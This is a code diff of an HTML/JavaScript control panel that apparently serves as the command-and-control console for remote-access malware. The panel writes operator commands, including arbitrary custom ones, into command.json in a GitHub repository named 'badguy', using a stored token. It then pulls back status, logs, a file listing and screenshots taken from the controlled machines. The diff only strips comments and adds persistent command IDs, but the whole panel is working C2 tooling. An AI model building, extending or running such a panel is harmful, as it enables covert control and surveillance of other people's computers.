@@ -264,7 +264,6 @@
         </div>
 
         <div class="grid">
-            <!-- Команды -->
             <div class="panel">
                 <h2>⚡ QUICK COMMANDS</h2>
                 <div class="cmd-grid">
@@ -284,7 +283,6 @@
                 </div>
             </div>
 
-            <!-- Кастомная команда -->
             <div class="panel">
                 <h2>⌨️ CUSTOM COMMAND</h2>
                 <div class="input-group">
@@ -297,7 +295,6 @@
             </div>
         </div>
 
-        <!-- Результаты -->
         <div class="panel" style="margin-top:20px;">
             <h2>📊 RESULTS & LOGS</h2>
             <div style="display:flex;gap:10px;margin-bottom:10px;">
@@ -311,7 +308,6 @@
             </div>
         </div>
 
-        <!-- Медиа -->
         <div class="panel" style="margin-top:20px;">
             <h2>🖼️ MEDIA</h2>
             <div class="media-grid" id="mediaGrid">
@@ -319,7 +315,6 @@
             </div>
         </div>
 
-        <!-- Файлы -->
         <div class="panel" style="margin-top:20px;">
             <h2>📁 FILES</h2>
             <div class="file-browser" id="fileBrowser">
@@ -331,18 +326,25 @@
     <script>
         // ===== КОНФИГУРАЦИЯ =====
         const GITHUB_OWNER = 'chotkof';
-        const GITHUB_REPO = 'badguy';  // ИСПРАВЛЕНО на badguy
-        const COMMAND_FILE = 'command.json';  // ТОЧНО command.json
+        const GITHUB_REPO = 'badguy';
+        const COMMAND_FILE = 'command.json';
         const RAW_URL = `https://raw.githubusercontent.com/${GITHUB_OWNER}/${GITHUB_REPO}/main/`;
 
-        let commandId = 0;
+        // ===== СОХРАНЯЕМ ID В localStorage =====
+        function getCommandId() {
+            let id = parseInt(localStorage.getItem('frederick_command_id') || '0');
+            return id;
+        }
 
-        // ===== Отправка команды с retry =====
+        function setCommandId(id) {
+            localStorage.setItem('frederick_command_id', String(id));
+        }
+
+        // ===== Отправка команды =====
         async function sendCmd(cmd, retryCount = 0) {
             const logArea = document.getElementById('logArea');
             addLog('command', `➤ ${cmd}`);
 
-            // Получаем токен
             let token = localStorage.getItem('github_token');
             if (!token) {
                 token = prompt('Enter GitHub token:');
@@ -354,7 +356,6 @@
             }
 
             try {
-                // ЧИТАЕМ текущий command.json
                 let current = [];
                 let sha = null;
                 
@@ -373,11 +374,9 @@
                             current = JSON.parse(decoded);
                         }
                         sha = data.sha;
-                        addLog('info', `📄 Current SHA: ${sha.substring(0, 8)}...`);
                     } else if (shaResp.status === 404) {
                         current = [];
                         sha = null;
-                        addLog('info', '📄 Creating new file');
                     } else {
                         const err = await shaResp.json();
                         if (shaResp.status === 401 || shaResp.status === 403) {
@@ -393,11 +392,12 @@
                     return;
                 }
 
-                // Добавляем команду
-                commandId++;
+                // ===== ГЕНЕРИРУЕМ УНИКАЛЬНЫЙ ID =====
+                let commandId = getCommandId() + 1;
+                setCommandId(commandId);
+                
                 current.push({ id: String(commandId), cmd: cmd });
 
-                // ПЫТАЕМСЯ записать
                 const payload = {
                     message: `Command: ${cmd}`,
                     content: btoa(unescape(encodeURIComponent(JSON.stringify(current, null, 2)))),
@@ -415,7 +415,7 @@
                 });
 
                 if (resp.ok) {
-                    addLog('success', `✅ Command sent: ${cmd}`);
+                    addLog('success', `✅ Command sent: ${cmd} (ID: ${commandId})`);
                     setTimeout(fetchStatus, 2000);
                 } else {
                     const err = await resp.json();
@@ -438,7 +438,6 @@
             }
         }
 
-        // ===== Кастомная команда =====
         function sendCustomCmd() {
             const input = document.getElementById('customCmd');
             const cmd = input.value.trim();
@@ -448,7 +447,6 @@
             }
         }
 
-        // ===== Логи =====
         function addLog(type, text) {
             const logArea = document.getElementById('logArea');
             const time = new Date().toLocaleTimeString();
@@ -461,7 +459,6 @@
             }
         }
 
-        // ===== Fetch logs =====
         async function fetchLogs() {
             try {
                 const resp = await fetch(RAW_URL + 'logs/');
@@ -498,7 +495,6 @@
             }
         }
 
-        // ===== Fetch status =====
         async function fetchStatus() {
             try {
                 const resp = await fetch(RAW_URL + 'status.json');
@@ -512,14 +508,13 @@
                     document.getElementById('aeroStatus').textContent = status.aeroInstalled ? '✅' : 'OFF';
                     addLog('success', `📊 Status updated: ${status.windowCount} windows`);
                 } else {
-                    addLog('info', '📊 Status file not found yet. Run /status command first.');
+                    addLog('info', '📊 Status file not found yet');
                 }
             } catch(e) {
                 addLog('error', `❌ ${e.message}`);
             }
         }
 
-        // ===== Fetch files =====
         async function fetchFiles() {
             try {
                 const resp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/`);
@@ -550,7 +545,6 @@
             }
         }
 
-        // ===== Fetch screenshots из outputs/images =====
         async function fetchScreenshots() {
             try {
                 const resp = await fetch(`https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/outputs/images`);
@@ -582,17 +576,15 @@
             }
         }
 
-        // ===== Auto status update =====
         setInterval(fetchStatus, 30000);
 
-        // ===== Initial load =====
         fetchStatus();
         addLog('info', '🚀 Frederick Control Panel loaded');
         addLog('info', '📡 Send commands via the buttons above');
         addLog('info', `📁 Repo: ${GITHUB_OWNER}/${GITHUB_REPO}`);
         addLog('info', `📄 Command file: ${COMMAND_FILE}`);
+        addLog('info', `🆔 Next command ID: ${getCommandId() + 1}`);
 
-        // ===== Check if files exist =====
         async function checkFiles() {
             try {
                 const resp = await fetch(RAW_URL + COMMAND_FILE);
